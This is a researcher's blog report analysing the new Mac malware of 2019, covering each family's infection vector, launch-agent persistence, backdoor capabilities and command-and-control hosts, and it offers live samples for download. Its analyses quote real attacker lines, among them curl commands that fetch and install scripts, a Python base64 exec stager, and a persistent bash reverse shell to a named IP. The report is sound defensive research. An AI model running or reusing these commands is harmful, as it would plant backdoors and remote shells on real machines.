üìù üëæ Want to play along?
All samples covered in this post are available in our malware collection.
‚Ä¶just make sure not to infect yourself!
A printable (PDF) version of this report can be downloaded here:
The Mac Malware of 2019.pdf
and hello 2020 ‚Ä¶a new decade!
For the fourth year in a row, I‚Äôve decided to put together a blog post that comprehensively covers all the new Mac malware that appeared during the course of the year.
While the specimens may have been briefly reported on before (i.e.
by the AV company that discovered them), this blog aims to cumulatively and comprehensively cover all the new Mac malware of 2019 - in one place ‚Ä¶yes, with samples of each malware for download!
In this blog post, we‚Äôre focusing on new Mac malware specimens or new variants that appeared in 2019.
Adware and/or malware from previous years, are not covered.
However at the end of this blog, I‚Äôve included a brief section dedicated to these other threats, that includes links to detailed write-ups.
For each malicious specimen covered in this post, we‚Äôll identify the malware‚Äôs:
Infection Vector

‚Ä¶how it was able to infect macOS systems.
Persistence Mechanism

‚Ä¶how it installed itself, to ensure it would be automatically restarted on reboot/user login.
Features & Goals

‚Ä¶what was the purpose of the malware?
Also, for each malware specimen, I‚Äôve added a direct download link, in case you want to follow along with our analysis or dig into the malware more!
I‚Äôd personally like to thank the following organizations, groups, and researchers for their work, analysis, & assistance!
The ‚Äúmalwareland‚Äù channel on the MacAdmins slack group.
@thomasareed / @morpheus______ / @philofishal / and others who choose to remain unnamed.
Throughout this blog, we‚Äôll reference various tools used in analyzing the malware specimens.
ProcessMonitor

Our user-mode (open-source) utility that monitors process creations and terminations, providing detailed information about such events.
FileMonitor

Our user-mode (open-source) utility monitors file events (such as creation, modifications, and deletions) providing detailed information about such events.
WhatsYourSign

Our (open-source) utility that displays code-signing information, via the UI.
lldb

The de-facto commandline debugger for macOS.
Installed (to /usr/bin/lldb) as part of Xcode.
Hopper Disassembler

A ‚Äúreverse engineering tool (for macOS) that lets you disassemble, decompile and debug your applications‚Äù ‚Ä¶or malware specimens!
If you‚Äôre interested in general Mac malware analysis techniques, check out the following resources:
‚ÄúLets Play Doctor: Practical OSX Malware Detection & Analysis‚Äù
‚ÄúHow to Reverse Malware on macOS Without Getting Infected‚Äù
CookieMiner is a cryptominer that also steals user cookies and passwords, likely to give attackers access to victims online accounts and wallets.
Unit 42 (of Palo Alto Networks) who uncovered CookieMiner and wrote the original report on the malware, made no mention the malware‚Äôs initial infection vector.
However, a ThreatPost writeup states that:
‚ÄúJen Miller-Osborn, deputy director of Threat Intelligence for Unit 42, told Threatpost that researchers are not certain how victims are first infected by the shell script, but they suspect victims download a malicious program from a third-party store.‚Äù
‚ÄúJen Miller-Osborn, deputy director of Threat Intelligence for Unit 42, told Threatpost that researchers are not certain how victims are first infected by the shell script, but they suspect victims download a malicious program from a third-party store.‚Äù
‚Ä¶as such, CookieMiner‚Äôs infection vector remains unknown.
Persistence: Launch Agent

As noted in Unit 42‚Äôs report, CookieMiner persists two launch agents.
This is performed during the first stage of the infection, via a shell script named uploadminer.sh:
The script, uploadminer.sh, downloads (via curl), two property lists into the ~/Library/LaunchAgents directory.
The first plist, com.apple.rig2.plist, persists a binary named xmrig2 along with several commandline arguments:
As the RunAtLoad key is set to true in the launch agent property list, the xmrig2 binary will be automatically launched each time the user (re)logs in.
The second plist, com.proxy.initialize.plist, persists various inline python commands (that appear to execute a base64 encoded chunk of data):
As the RunAtLoad key is set to true in this property list as well, the python commands will be automatically (re)executed each time the user logs in.
In fact this is exactly how OSX.DarthMiner persisted.
(We also covered OSX.DarthMiner in our ‚ÄúThe Mac Malware of 2018‚Äù report).
This is not a coincidence, as (was noted in the Unit 42 report): ‚Äú[CookieMiner] has been developed from OSX.DarthMiner, a malware known to target the Mac platform‚Äù


Capabilities: Cryptomining, Cookie/Password Stealing, Backdoor
CookieMiner is likely the evolution of OSX.DarthMiner.
In our ‚ÄúThe Mac Malware of 2018‚Äù report we noted that DarthMiner, persists the well known Empyre backdoor (via the com.proxy.initialize.plist file) and a cryptocurrency mining binary named XMRig (via com.apple.rig.plist).
CookieMiner does this as well (though a 2 has been added to both the mining binary and plist):
The persistently installed Empyre backdoor allows remote attacks to run arbitrary commands on an infected host.
By examining the arguments passed to the persistent miner binary, xmrig2 it appears to be mining the Koto cryptocurrency:
The most interesting aspect of CookieMiner (and what differentiates it from OSX.DarthMiner) is its propensity for stealing!
During their comprehensive analysis Unit 42 researchers highlighted the fact that CookieMiner captures and exfiltrates the following:
The cookie, password, and message stealing capabilities are (likely) implemented to allow attackers to bypass 2FA protections on victims online cryptocurrency accounts:
‚ÄúBy leveraging the combination of stolen login credentials, web cookies, and SMS data, based on past attacks like this, we believe the bad actors could bypass multi-factor authentication for these [cryptocurrency] sites.
If successful, the attackers would have full access to the victim‚Äôs exchange account and/or wallet and be able to use those funds as if they were the user themselves.‚Äù -Unit 42
The methods to steal such information, are not (overly) sophisticated, albeit sufficient.
For example, to steal cookies from Safari, CookieMiner simply copies the Cookies.binarycookies file from the ~/Library/Cookies directory, zips them up, and exfiltrates them to the attacker‚Äôs remote command & control server (46.226.108.171):
Note though, the cookie file (Cookies.binarycookies) is only stolen if it contains cookies that are associated with cryptocurrency exchanges (such as Coinbase & Binance).
The malware also extracts saved passwords and credit card information from Google Chrome, via a python script:
‚ÄúCookieMiner downloads a Python script named ‚Äúharmlesslittlecode.py‚Äù to extract saved login credentials and credit card information from Chrome‚Äôs local data storage.‚Äù -Unit 42
Finally, CookieMiner attempts to locate and exfiltrate iPhone message files from any mobile backups (within MobileSync/Backup):
Armed browser cookies, passwords, and even iPhone messages, the attacker may be able to access (and thus potentially drain) victims‚Äô cryptocurrency accounts, even if 2FA is deployed!
Yort is a Lazarus group (1st-stage?)
‚ÄúCryptocurrency Businesses Still Being Targeted By Lazarus‚Äù
‚ÄúLazarus Apt Targets Mac Users With Poisoned Word Document‚Äù
‚ÄúA Look into the Lazarus Group‚Äôs Operations in October 2019‚Äù



Infection Vector: Malicious Office Documents


Infection Vector: Malicious Office Documents
The SecureList report which details the attack and Yort malware, states that:
‚ÄúThe malware was distributed via documents carefully prepared to attract the attention of cryptocurrency professionals.‚Äù -SecureList
Analyzing the one of the malicious files (·Ñâ·Ö¢·Ü∑·Ñë·Ö≥·ÜØ_·ÑÄ·Öµ·Ñâ·ÖÆ·ÜØ·Ñâ·Ö°·Ñã·Ö•·Ü∏·ÑÄ·Ö®·Ñí·Ö¨·Ü®·Ñâ·Ö•(·Ñá·Ö¶·Ü´·Ñé·Ö•·ÑÄ·Öµ·Ñã·Ö•·Ü∏·Ñë·Öß·Üº·ÑÄ·Ö°·Ñã·Ö≠·Üº).doc), we find embedded Mac-specific macro code:
If a Mac user opens the document in Microsoft Office and enables macros, these malicious macros will be automatically executed (triggered via the AutoOpen()) function.
For more details on the malicious macros in this attack, see @philofishal‚Äôs writeup:
‚ÄúLazarus Apt Targets Mac Users With Poisoned Word Document‚Äù
It does not appear that (this variant) of OSX.Yort persists itself.
However, as a light-weight 1st-stage implant, persistence may not be needed, as a noted in an analysis titled, ‚ÄúA Look into the Lazarus Group‚Äôs Operations in October 2019‚Äù:
‚ÄúThe malware doesn‚Äôt have a persistence, but by the fact that [it] can execute [any] command, the attacker can decide push a persistence if this necessary‚Äù


Capabilities: 1st-stage implant, with standard backdoor capabilities.
Yort (likely a 1st-stage implant), supports a variety of ‚Äòstandard‚Äô commands, such as file download, upload, and the execution of arbitrary commands.
Using macOS‚Äôs built-in file utility, shows that mt.dat is a standard 64-bit macOS (Mach-O) executable.
$ file Yort/A/mt.dat 
Yort/A/mt.dat: Mach-O 64-bit executable x86_64
The strings command (executed with the -a flag) can dump (ASCII) strings, that are embedded in the binary.
In OSX.Yort‚Äôs case these strings are rather revealing:
It is easy to confirm that the embedded URLs are malware‚Äôs actual command and control servers, as when executed (in a VM), the malware attempts to connect out to (one of) these addresses for tasking:
From this output, it seems reasonable to assume that the malware supports a variety of commands that are fairly common in first-stage implants and/or lightweight backdoors.
And references to the curl_* APIs likely indicate that the malware implements its networking logic via libcurl.
Debugging the malware (via lldb) confirms that indeed the malware is leveraging libcurl.
Here for example we see the malware setting the url of its command and control server (baseballcharlemagnelegardeur.com) via the curl_easy_setopt function with the CURLOPT_URL (10002) parameter:
The malware then connects to the specified server, via the curl_easy_perform function.
If the malware receives a response (tasking) from the command and control server, it will act upon said response (via switch statement, or jumptable).
The logic that implements delegation of the received commands is found at address 0x0000000100004679 within the malware‚Äôs binary:
For example for case #19, the malware will execute the ReplyDown command:
Digging into the disassembly of the ReplyDown command, shows that the malware will invoke functions such as:
This (brief) static analysis indicates this method will download a file, from the infected machine to the server.
Another example is #case 22, which calls into the ReplyExec function.
The ReplyExec function, as its names implies, will executed perhaps a command or file uploaded to the client from the server:
Similar analysis of the other Reply* commands confirm their rather descriptive names, match their logic.
For more details on the capabilities of mt.data, see:
‚ÄúA Look into the Lazarus Group‚Äôs Operations in October 2019‚Äù
Siggen, packaged in a fake WhatsApp application, is a persistent backdoor that allows remote attackers to download and execute (python) payloads.
‚ÄúmacOS Malware Outbreaks 2019 | The First 6 Months‚Äù



Infection Vector: Trojaned (fake) WhatsApp Application


Infection Vector: Trojaned (fake) WhatsApp Application
‚ÄúPhishing AI‚Äù @phishingai, stated the following in a tweet:
‚ÄúThis
@WhatsApp #phishing/drive-by-download domain message-whatsapp[.
]com


‚Ä¶is delivering malware via an iframe.
The iframe delivers a custom response depending on the device detected.
Mac malware is delivered via a zip file with an application inside.‚Äú

This @WhatsApp #phishing/drive-by-download domain message-whatsapp[.
]com...is delivering malware via an iframe.
The iframe delivers a custom response depending on the device detected.
Mac malware is delivered via a Zip file with an application inside.cc: @Lookout pic.twitter.com/c7A8mwp4iy‚Äî Phishing AI (@PhishingAi) April 25, 2019
This @WhatsApp #phishing/drive-by-download domain message-whatsapp[.
]com...is delivering malware via an iframe.
The iframe delivers a custom response depending on the device detected.
Mac malware is delivered via a Zip file with an application inside.cc: @Lookout pic.twitter.com/c7A8mwp4iy
A screen capture from @phishingai‚Äôs tweet of the malicious message-whatsapp.com website, shows how users could be tricked into manually downloading and installing what they believe is the popular WhatsApp messaging application:
The download is a zip archive named WhatsAppWeb.zip ‚Ä¶that (surprise, surprise) is not WhatsApp, but rather an application named WhatsAppService
Will users be tricked into running this?
‚Ä¶and manually work thru the Gatekeeper alerts (as the app is unsigned)?
If the user is tricked into downloading and running the WhatsAppService application it will persistently install a launch agent.
The WhatsAppService was built using Platypus.
This legitimate developer tool creates a standalone app, from a script:
‚ÄúPlatypus is a developer tool that creates native Mac applications from command line scripts such as shell scripts or Python, Perl, Ruby, Tcl, JavaScript and PHP programs.
This is done by wrapping the script in a macOS application bundle along with an app binary that runs the script.‚Äù -sveinbjorn.org/platypus
It‚Äôs rather popular with (basic) Mac malware authors who are sufficient are creating malicious scripts, but want to distributer their malicious creations as native macOS applications.
For example both OSX.CreativeUpdate and OSX.Eleanor utilized Platypus as well:
When a ‚Äúplatypus‚Äù applications is executed, it simple runs a file named script from within the app‚Äôs Resources directory.

Taking a peek at the WhatsAppService.app/Resources/script file, we can see it persists a launch agent named a.plist:
Specifically it executes the following: curl -s http://usb.mine.nu/a.plist -o ~/Library/LaunchAgents/a.plist
The a.plist (that is downloaded from http://usb.mine.nu/) executes the /Users/Shared/c.sh file:
The c.sh file is (also) downloaded via the WhatsAppService.app/Resources/script: curl -s http://usb.mine.nu/c.sh -o /Users/Shared/c.sh
As the RunAtLoad key is set to true in the a.plist every time the user logs in, c.sh will be automatically (re)executed.


Capabilities: Persistent Backdoor (download & execute (python) payloads).
Recall the WhatsAppService.app/Resources/script is ran when the user launches WhatsAppService.app.
Let‚Äôs break down each line of this script:
And what does /Users/Shared/c.sh do?
After connecting to usb.mine.nu/p.php and checking for a response containing the string "open" and checking if a process named HEYgiNb is running, script decodes a large blog of base64 encoded data.
This decoded data is then executed via python.
After decoding the data, as expected, it turns out to be a python code:
This (decoded) python code matches the HEYgiNb file described in DrWeb‚Äôs analysis (‚ÄúMac.BackDoor.Siggen.20‚Äù).
(Also recall the c.sh checks for the presence of a process named HEYgiNb).
We can also locate this file on VirusTotal: HEYgiNb.py.
and note that it is flagged by multiple engines:
Taking a closer look at this python code (HEYgiNb), we see the Cookie parameter contains (more) base64 encoded data, which we can decode:
Following a request to http://zr.webhop.org on port 1337, the python code base64 decodes and executes data extracted from the server‚Äôs (404) response:


exec(b64decode(ex.read().split("DEBUG:\n")[1].replace("DEBUG-->", ""))).
Unfortunately the server http://zr.webhop.org is no longer serving up this final-stage payload.
However, @philofishal notes that: ‚ÄúFurther analysis shows that the script leverages a public post exploitation kit, Evil.OSX to install a backdoor.‚Äú
‚Ä¶and of course, the attackers could swap out the python payload (server-side) anytime, to execute whatever they want on the infected systems!
BirdMiner (or LoudMiner) delivers linux-based cryptominer, that runs on macOS via QEMU emulation.
‚ÄúNew Mac cryptominer Malwarebytes detects as Bird Miner runs by emulating Linux‚Äù
‚ÄúLoudMiner: Cross‚Äëplatform mining in cracked VST software‚Äù



Infection Vector: Pirated Applications
BirdMiner was distributed via pirated (cracked) applications on the the ‚ÄúVST Crack‚Äù website.
Thomas Reed (@thomasareed) the well-known Mac malware analyst and author of the ‚ÄúNew Mac cryptominer‚Ä¶ Bird Miner‚Äù writeup, states:
‚ÄúBird Miner has been found in a cracked installer for the high-end music production software Ableton Live‚Äù -Thomas Reed
ESET, who also analyzed the malware, discussed its infection mechanism as well.
Specifically their research uncovered almost 100 pirated applications all related to digital audio / virtual studio technology (VST) that, (like the cracked Ableton Live software package) likely contained the BirdMiner malware.
Of course, users who downloaded and installed these pirated applications, would become infected with the malware.
It should be noted that the downloaded package (Ableton Live Suite 10.1.pkg) is unsigned, thus will be blocked by macOS:
Rather amusingly though, an Instructions.txt file explicitly tells user how to (manually) sidestep this:
One of the pirated applications that is infected with OSX.BirdMiner is Ableton Live, ‚Äúa digital audio workstation for macOS‚Äù.
The infected application is distributed as a standard disk image; Ableton.Live.10.Suite.v10.1.dmg
When the disk image is mounted and the application installer (Ableton Live Suite 10.1.pkg) is executed it will first request the user‚Äôs credentials:
Now, with root privileges BirdMiner can persists several launch daemons.
This can be passively observed by via Objective-See‚Äôs FileMonitor utility:
See ‚ÄúNew Mac cryptominer‚Ä¶ Bird Miner‚Äù for more details.
The names of the property lists (com.decker.plist, com.tractableness.plist) and the names of the files they persist are randomly generated.
See ‚ÄúNew Mac cryptominer‚Ä¶ Bird Miner‚Äù for more details.
The com.decker.plist launch daemon persists a file named vicontiel (placed in /usr/local/bin/):
Similarly, the com.tractableness.plist launch daemon persists a file named Tortulaceae (again, in /usr/local/bin/):


# defaults read /Library/LaunchDaemons/com.tractableness.plist 
{
    KeepAlive = 1;
    Label = "com.tractableness.plist";
    ProgramArguments =     (
        "/usr/local/bin/Tortulaceae"
    );
    RunAtLoad = 1;
}
As RunAtLoad is set to 1 (true) in both property list files, the persisted files (vicontiel, and Tortulaceae) will be automatically (re)launched by the OS each time the infected system is restarted.
Both files (vicontiel, and Tortulaceae, though recall these names are randomly generated), are bash scripts:
The vicontiel script will either unload the com.tractableness.plist launch daemon if the user has Activity Monitor running (likely for stealth reasons), or if not, will load the plist:
The Tortulaceae (executed by the com.tractableness.plist) will similarly unload the plist if Activity Monitor is running.
However, if not, it will execute the following: /usr/local/bin/voteen -m 3G -accel hvf,thread=multi -smp cpus=2 --cpu host /usr/local/bin/archfounder -display none
As noted by Thomas Reed in his writeup, /usr/local/bin/voteen, is actually the open-source emulator QEMU!
QEMU is able to execute (via emulation) Linux binaries on systems that are not Linux (such as macOS).
This begs the question, what is it executing?
The file command (well, and Reed‚Äôs writeup) provide the answer:
The archfounder file (that is passed into QEMU (voteen)), is a QEMU QCOW image, which (thanks again to Reed‚Äôs analysis) we know is: ‚Äúa bootable [Tiny Core] Linux system.‚Äú
Ok, so we‚Äôve got a peristent macOS launch daemon, that‚Äôs executing a bash script, which (via QEMU), is booting a Linux system.
Reed again has the answer:
‚Äú[the] bootlocal.sh file contains commands [that are automatically executed during startup] to get xmrig up and running:
‚Ä¶thus, as soon as the Tiny Core system boots up, xmrig launches without ever needing a user to log in.‚Äù
So all that work to persist a linux-version of xmrig (a well known cryptocurrency miner?)
There are macOS builds of xmrig, meaning the attacker could have simply persisted such a build and thus skipped the entire QEMU/Linux aspect of this attack.
Netwire is a fully-featured persistent backdoor.
Interestinly, while Netwire.A appeared on Apple‚Äôs radar a few years ago, it only publicly emerged in 2019.
‚ÄúA Firefox 0day Drops a macOS Backdoor (OSX.Netwire.A)‚Äù
‚ÄúPotent Firefox 0-day used to install undetected backdoors on Macs‚Äù
It all started with an email sent our way, from a user (working at a crypto-currency exchange) who‚Äôs Mac had been infected ‚Ä¶apparently via a browser 0day!
‚ÄúLast week Wednesday I was hit with an as-yet-unknown Firefox 0day that somehow dropped a binary and executed it on my mac (10.14.5)


Let me know if you would be interested in analysing the binary, might be something interesting in there wrt bypassing osx gatekeeper.‚Äú
Moreover, the user was able to provide a copy of the email that contained a link to the malicious website (people.ds.cam.ac.uk):
This (Firefox) 0day, has now been patched as CVE-2019-11707, and covered in various articles such as:
For more information on the technical details of this browser bug, check out Samuel Gro√ü‚Äôs twitter thread:

Thanks to @coinbase I've had a chance to look at the in-the-wild exploit for the recent Firefox 0day (the RCE) that they caught.
Tl;dr: it looks a lot like a bug collision between Fuzzilli and someone manually auditing for bugs.
My notes:‚Äî Samuel Gro√ü (@5aelo) June 25, 2019
Thanks to @coinbase I've had a chance to look at the in-the-wild exploit for the recent Firefox 0day (the RCE) that they caught.
Tl;dr: it looks a lot like a bug collision between Fuzzilli and someone manually auditing for bugs.
As the bug was exploited as a 0day vulnerability, if any user visited the malicious site people.ds.cam.ac.uk via Firefox (even fully-patched!
), the page would ‚Äúthrow‚Äù that exploit and automatically infect the Mac computer.
With the ability to download and execute arbitrary payloads, the attackers could install whatever macOS malware they desired!
One of the payloads they chose to install was OSX.Netwire (on other systems, the attacker choose to install OSX.Mokes).
Unfortunately those protection mechanisms only come into play, if the binary / application contains the ‚Äúquarantine attribute‚Äù.
Via an exploit, an attacker can ensure their payload, of course, does not contain this attribute (thus neatly avoiding Gatekeeper):
For details on File Quarantine/Gatekeeper see: ‚ÄúGatekeeper Exposed‚Äù
..also note, that in macOS 10.15 (Catalina), File Quarantine/Gatekeeper have been improved, and thus may (now) thwart this attack vector!



Persistence: Login Item & Launch Agent


Persistence: Login Item & Launch Agent
A quick peek at the malware‚Äôs disassembly reveals an launch agent plist, embedded directly within the binary:
Seems reasonable to assume the malware will persist as launch agent.
However, it also appears to contain logic to persist as a login item (note the call to the LSSharedFileListInsertItemURL API):
Executing the malware (in VM), shows that it persists twice!
First as launch agent (com.mac.host.plist), and then as a login item.
Let‚Äôs take a peek at the launch agent plist, com.mac.host.plist:
As the RunAtLoad key set to 1 (true), the OS will automatically launch the binary specified in the ProgramArguments array (~/.defaults/Finder.app/Contents/MacOS/Finder) each time the user logs in.
The login item will also ensure the malware is launched.
Login items however show up in the UI, clearly detracting from the malware‚Äôs stealth:
Is persisting twice better than once?
Not really, especially if you are running Objective-See‚Äôs lovely tools such as BlockBlock which detects both persistence attempts:
For details on persisting as a login item (and the role of backgroundTaskManagementAgent), see our recent blog post: ‚ÄúBlock Blocking Login Items‚Äù.
Via (what was) a Firefox 0day, attackers remotely infected macOS systems with OSX.Netwire.
Persistenly installing the malware (Finder.app) afforded the attackers full remote access to compromised systems.
Here, we briefly discuss the specific capabilities of the OSX.Netwire.A backdoor.
For a detailed technical analysis of Netwire (that focuses specifically on uncovering its capabilities) see:
‚ÄúPart II: A Firefox 0day drops a macOS Backdoor (OSX.Netwire.A)‚Äù
After extracting the address of its command and control server from an encryted (embedded) config file, Netwire connects to said server for tasking.
Though this server (89.34.111.113) is now offline, static analysis reveals that the malware expects a response containing tasking data, including an integer value of the command to execute.
This integer is used to index into an array (0x0000d1b0) of supported commands:
By statically analyzing the code referenced in this array we can uncover Netwire‚Äôs capabilities.
For example, ‚Äúcommand‚Äù 0x1A (26d) will rename a file:
0x00004f37         push       ebx 
0x00004f38         push       edi
0x00004f39         call       imp___symbol_stub__rename
‚Ä¶while ‚Äúcommand‚Äù 0x1B (27d) will delete a file via the unlink API:
0x00004f5e         sub        esp, 0xc                                          
0x00004f61         push       esi
0x00004f62         mov        edi, ecx
0x00004f64         call       imp___symbol_stub__unlink
OSX.Netwire also can be remotely tasked to interact with process(es), for example listing them (‚Äúcommand‚Äù 0x42, 66d):
; case 0x42,
...
push       esi
push       edi
push       0x0
push       0x1
call       imp___symbol_stub__proc_listpids
‚Ä¶or killing them (‚Äúcommand‚Äù 0x2C, 44d):
; case 0x2C,
...
0x000056fa         push       0x9
0x000056fc         push       eax
0x000056fd         call       imp___symbol_stub__kill
Via ‚Äúcommand‚Äù 0x19 (25d) the malware will invoke a helper method, 0x0000344c which will fork then execv a process:
eax = fork();
if (((eax == 0xffffffff ?
0x1 : 0x0) != (eax <= 0x0 ?
0x1 : 0x0)) && (eax == 0x0)) {
        execv(esi, &var_18);
        eax = exit(0x0);
}
The malware can also interact with the UI, for example to capture a screen shot.
Interestingly it also appears that OSX.Netwire may be remotely tasked to generate synthetic keyboard and mouse events.
Specifically synthetic keyboard events are created and posted when ‚Äúcommand‚Äù 0x34 (52d) is received from the c&c server.
To create and post the event, the malware invokes the CGEventCreateKeyboardEvent and CGEventPost APIs.
clicks, moves, etc) are generated in response to ‚Äúcommand‚Äù 0x35 (53d):
void sub_9a29() {
  edi = CGEventCreateMouseEvent(0x0, edx, ...);
  CGEventSetType(edi, edx);
  CGEventPost(0x0, edi);
  return;
}
Finally, via ‚Äúcommand‚Äù 0x7 it appears that the malware can be remotely instructed to uninstall itself.
Note the calls to unlink to remove the launch agent plist and the malware‚Äôs binary image, and the call to LSSharedFileListItemRemove to remove the login item:
Mokes.B is a new variant of the Mokes malware; a fully-featured macOS backdoor.
‚ÄúA Firefox 0day Drops Another macOS Backdoor (OSX.Mokes.B)‚Äù
‚ÄúPotent Firefox 0-day used to install undetected backdoors on Macs‚Äù
The (first) hash he mentioned, b639bca429778d24bda4f4a40c1bbc64de46fa79 turned out to be new variant of Mokes that we named OSX.Mokes.B:
For more details on the Firefox 0day see our discussion (above) on OSX.Netwire
When executed, OSX.Mokes.B persists itself as a launch agent (quicklookd.plist):
As the launch agent (quicklookd.plist) has the RunAtLoad key set (to 1), the OS will automatically launch the specified binary (/Users/user/Library/Dropbox/quicklookd), each time the user logs in.
This provides the malware persistence.
Interestingly directly embedded within Mokes are other names for both the plist and the for name of the (installed) malware.
It appears to (rather) randomly and dynamically select names for these, likely in order to complicate signature-based detections.
For example restoring the (analysis) VM to a pristine state and (re)running the malware, results in the malware selecting one of the other strings pairs (e.g.
App Store / storeaccountd) for installation and persistence purposes:
The orginal OSX.Mokes, is cross-platform, fully-featured backdoor that was discovered by Kaspersky in 2016.
In an excellent writeup, ‚ÄúThe Missing Piece ‚Äì Sophisticated OS X Backdoor Discovered‚Äù, they detailed OSX.Mokes installation, persistence, network comms and rather impressive capabilities (screen capture, audio capture, document discovery & exfiltration, and more).
Though there a some differences between the orginal Mokes samples and OSX.Mokes.B, their capabilities largely overlap.
To record the user, the malware utilizes popular QT framework.
This cross-platform framework contains macOS-specific webcam recording code:
GMERA is a Lazarus group trojan, that persistently exposes a shell to remote attackers
‚ÄúMac Malware that Spoofs Trading App Steals User Information, Uploads it to Website‚Äù
‚ÄúDetecting macOS.GMERA Malware Through Behavioral Inspection‚Äù



Infection Vector: Fake Cryptocurrency App


Infection Vector: Fake Cryptocurrency App
The de-facto infection mechanism of the Lazarus group, is to create fake crypto-currency applications (often backed by a legitimate looking website), and coerce users installed said applications.
In a previous (albeit related) attack in 2018, Kaspersky wrote:
‚ÄúThe victim had been infected with the help of a trojanized cryptocurrency trading application, which had been recommended to the company over email.
It turned out that an unsuspecting employee of the company had willingly downloaded a third-party application from a legitimate looking website [Celas LLC].
The Celas LLC ‚Ä¶looks like the threat actor has found an elaborate way to create a legitimate looking business and inject a malicious payload into a ‚Äúlegitimate looking‚Äù software update mechanism.
Sounds logical: if one cannot compromise a supply chain, why not to make fake one?‚Äù
I also talked about this previous attack in several conference talks:
In 2019, Lazarus group continued this trend, as noted by TrendMicro:
‚ÄúHowever, their popularity has led to their abuse by cybercriminals who create fake trading apps as lures for unsuspecting victims to steal their personal data.
We recently found and analyzed an example of such an app, which had a malicious malware variant that disguised itself as a legitimate Mac-based trading app called Stockfolio.‚Äù
Thus if a targeted user downloads and runs the Stockfolio application, they will become infected with OSX.GMERA



Persistence: Launch Agent
In their report TrendMicro notes that only the second version of GMERA (B) persists.
Take a peak at the trojanized Stockfolio application bundle of OSX.GMERA.B reveals the presence of a file named run.sh in the Resources/ directory:
This script will install a persistent (hidden) launch agent to: ~/Library/LaunchAgents/.com.apple.upd.plist:
Decoding the plist_text variable reveals the contents of this plist:
As the ~/Library/LaunchAgents/.com.apple.upd.plist has the RunAtLoad key set to <true/> the commands specified in the ProgramArguments array will be automatically executed each time the user logs in.
The TrendMicro report on GMERA notes that, ‚ÄúThe main Mach-O executable [of OSX.GMERA.A] will launch the following bundled shell scripts in the Resources directory: plugin, stock.‚Äù
Disassembling the main binary (Stockfoli.app/Contents/MacOS/Stockfoli) supports this claim:
Both the plugin and stock  files are bash scripts:
First, let‚Äôs look at the plugin script:
The script first gathers a bunch of information about the infected system, via the getINFO function.
This information includes survey including:
It then uploads this survey data to https://appstockfolio.com/panel/upload.php, writing out the server‚Äôs response to ~/Library/Containers/.pass
Now, on to the stock script:
The stock script first copies the Resources/appcode file to a temporary location (/private/var/tmp/appcode).
If the ~/Library/Containers/.pass file exists (recall this is created by the plugin script with information from the server), it will decrypt and execute the copy of the appcode file.
Unfortunately as the server is offline, the .pass is not created, and thus the appcode file cannot be decrypted:
‚ÄúWe suspect the file appcode is a malware file that contains additional routines.
However, at the time of writing, we were unable to decrypt this file since the upload URL hxxps://appstockfolio.com/panel/upload[.
Though the OSX.GMERA.B specimen shares various similarities with OSX.GMERA.A (such as its infection vector of a trojanized Stockfolio.app), its payload is different.
Recall OSX.GMERA.B executes the Resources/run.sh script.
After checking in with a server located at http://owpqkszz.info/link.php, the code within the run.sh script creates an interactive remote shell to  193.37.212.176:
We also noted that GMERA.B (via code within run.sh) persists a launch agent to: ~/Library/LaunchAgents/.com.apple.upd.plist, to automatically execute commands whenever the user logs in:
Decoding the base-64 encoded data in the command reveals the following:
while :; do sleep 10000; screen -X quit; lsof -ti :25733 | xargs kill -9; screen -d -m bash -c 'bash -i >/dev/tcp/193.37.212.176/25733 0>&1'; done
‚Ä¶ah, a persistent interactive remote shell to 193.37.212.176.
This of course gives a remote attacker, continued access to the infected system and the ability to run arbitrary commands.
This unnamed specimen, is yet another Lazarus group backdoor that affords a remote attacker complete command and control over infected macOS systems.



Infection Vector: Trojanized (Trading) Application


Infection Vector: Trojanized (Trading) Application
In early October, @malwrhunterteam tweeted about some interesting malware:

So, in short: anyone installed this "JMT Trader" recently (or anytime?
- others will probably have the time to dig and find out...), got some APT's malware with it too... pic.twitter.com/tEYJZEYxAq‚Äî MalwareHunterTeam (@malwrhunterteam) October 11, 2019
So, in short: anyone installed this "JMT Trader" recently (or anytime?
- others will probably have the time to dig and find out...), got some APT's malware with it too... pic.twitter.com/tEYJZEYxAq
If that highlighted not says anything to you... then look here in what malware it was seen before: https://t.co/xSfDulILh0cc @craiu pic.twitter.com/g2CyU87aLr
We noted early, that the de-facto method of infection utilized by the Lazarus group, was trojanized cryptocurrency trading applications.
This samples (which we refer to as OSX.AppleJeus 2, for lack of a better name), follow an identical approach to infect macOS targets.
First, a ‚Äúnew‚Äù company was created: ‚ÄúJMT Trading‚Äù (hosted at: https://www.jmttrading.org/):
Following the ‚ÄúDownload from Github‚Äù link, will take the user to: https://github.com/jmttrading/JMTTrader/releases, which contains various files for download.
Files that contain malware (specifically a disk image, that contain package named JMTTrader.pkg):
If the user is coerced into downloading and installing the trojanized cryptocurrency trading application, they will be infected.
Note that the installer requires administrative privileges, but the malware will kindly ask for such privileges during installation:
The JMTTrader.pkg contains a postinstall script (which contains the actual installation instructions).
Using the Suspicious Package app (available for download here), we can view the contents of this install file:
In short, this install script:
Both the daemon‚Äôs plist and binary are (originally) embedded into an application, JMTTrader.app found within the .pkg.
Specifically they‚Äôre hidden files found in the /Resources directory; Resources/.org.jmttrading.plist and Resources/.CrashReporter:
Using the ‚ÄúSuspicious Package‚Äù app we can extract both these file for analysis.
First, let‚Äôs look at the launch daemon plist (org.jmttrading.plist):
As expected, it references the daemon /Library/JMTTrader/CrashReporter (in the ProgramArguments array).
As the RunAtLoad is set to true macOS will automatically (re)start the daemon every time the system is rebooted.
The malware persists (via a Launch Daemon) the CrashReporter binary.
Via the file command, we can determine its file type (Mach-O 64-bit):


$ file ~/Downloads/.CrashReporter 
~/Downloads/.CrashReporter: Mach-O 64-bit executable x86_64
Using my WhatsYourSign utility, we can easily ascertain it‚Äôs code-signing status.
Though signed, it‚Äôs signed ad-hoc:
Running the strings command, affords us valuable insight into the (likely) functionality of the binary.
Always run the strings command with the -a flag to instruct it to scan the entire file for printable (ASCII) strings!
From the output of the strings command, we can see some interesting, well, strings!
beastgoc.com, https://%s/grepmonux.php
likely a download or C&C server?
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...
the binary‚Äôs user-agent (perhaps useful as an IOC)?
X,%\`PMk--Jj8s+6=
perhaps an encryption or decryption key?
The command and control server will respond with (encrypted) tasking.
Unfortunately during analysis, the C&C server did not return any tasking.
However, via static analysis, we can fairly easily ascertain the malware‚Äôs capabilities.
If the malware receives the up command, it appears to contain logic to open then write to a a file (i.e.
upload a file from the C&C server to an infected host):
Other commands, will cause the malware to invoke a function named: proc_cmd:
